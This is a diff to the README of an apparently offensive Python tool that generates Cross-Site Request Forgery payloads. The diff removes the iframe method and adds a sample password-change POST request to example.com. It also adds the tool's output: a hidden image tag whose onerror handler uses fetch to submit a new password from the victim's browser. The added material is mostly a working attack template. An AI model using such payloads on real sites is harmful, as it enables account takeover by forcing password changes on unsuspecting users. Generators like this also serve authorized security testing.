@@ -3,7 +3,7 @@ CSRF Payload Generator A powerful and flexible Cross-Site Request Forgery (CSRF)
 
 Features
 * Supports Multiple Payload Methods:
-    - iframe: Generates a hidden iframe to execute CSRF requests.
+    
     - fetch: Uses the Fetch API to execute CSRF requests programmatically.
     - onerror: Leverages the onerror event of an empty image tag for CSRF execution.
     - form: Auto-submitting HTML forms for CSRF attacks.
@@ -41,11 +41,11 @@ python3 csrf_generator.py request.txt
 
 4- Select the desired CSRF payload method:
 
-    1: iframe
-    2: fetch
-    3: onerror
-    4: form
-    5: All methods
+    
+    1: fetch
+    2: onerror
+    3: form
+    4: All methods
 View the output in the csrf_payloads.html file.
 
 
@@ -53,6 +53,51 @@ View the output in the csrf_payloads.html file.
     - Python 3.x: The script is written in Python and requires Python 3.x.
 
  
+---------------------------
+* Request sample :
+```
+  POST /user/change-password HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Cookie: sessionid=abcd1234efgh5678ijkl9012mnop3456
 
+new_password=newpassword456
+```
+
+----------------------------
+* Tool Output :
+
+  
+```
+   <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Payloads</title>
+</head>
+<body>
+    <h1>Generated CSRF Payloads</h1>
+
+    <h2>Onerror Payload</h2>
+    <div>
+        <pre>
+<img src="" onerror="fetch('http://www.example.com/user/change-password', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }, body: 'new_password=newpassword456xyy'
+})" style="display:none;">
+</pre>
+    </div>
+    <hr>
+
+</body>
+</html> 
+```
+
+  
  
 
